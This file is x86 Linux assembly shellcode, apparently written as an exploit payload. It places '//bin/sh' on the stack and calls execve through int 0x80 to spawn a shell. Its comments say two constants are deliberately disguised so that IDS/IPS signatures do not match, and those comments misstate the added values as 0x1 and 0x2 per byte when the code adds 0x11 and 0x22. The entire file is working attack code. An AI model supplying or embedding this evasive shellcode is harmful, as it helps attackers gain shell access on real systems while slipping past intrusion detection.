;author: 60dhi
;This program makes a execve syscall and invokes a /bin/sh shell using esp register/stack
;0x68732f6e69622f2f   --> hex encode of //bin/sh in reverse
global _start

section .text

_start:

	;PUSH the first null
	mov ebx, eax
	xor eax, ebx	 
	
	mov dword [esp - 4], eax
	sub esp, 4
	;push eax

	;PUSH //bin/sh
	;mov dword [esp - 4], 0x68732f6e
	; for the purpose of preventing detection from ids/ips, forging the above instruction
	; adding 0x1 to each byte of 0x57621e5d to make it 0x68732f6e and then placing it on the stack
	mov esi, 0x57621e5d
	add esi, 0x11111111
	mov dword [esp - 4], esi

	;mov dword [esp - 8], 0x69622f2f
	; for the purpose of preventing detection from ids/ips, forging the above instruction
	; adding 0x2 to each byte of 0x47400d0d to make it 0x69622f2f and then placing it on the stack
	mov esi, 0x47400d0d
	add esi, 0x22222222
	mov dword [esp - 8], esi

	;moving the stack pointer appropriately 
	sub esp, 8

	;push 0x68732f6e
	;push 0x69622f2f

	;Moving address of //bin/sh00000000 into ebx
	mov ebx, esp

	;PUSH second null dword
	push eax

	;Pointing edx to a Null value 0x00000000
	mov edx, esp

	;Pushing the address of //bin/sh00000000 onto the stack and moving it inside ecx
	push ebx
	;Moving address(of //bin/sh) + 0x000000000 into ecx 
	mov ecx, esp

	;Moving execve system call number 11 in eax
	mov al, 11
	;Invoking the system call by interrupt
	int 0x80




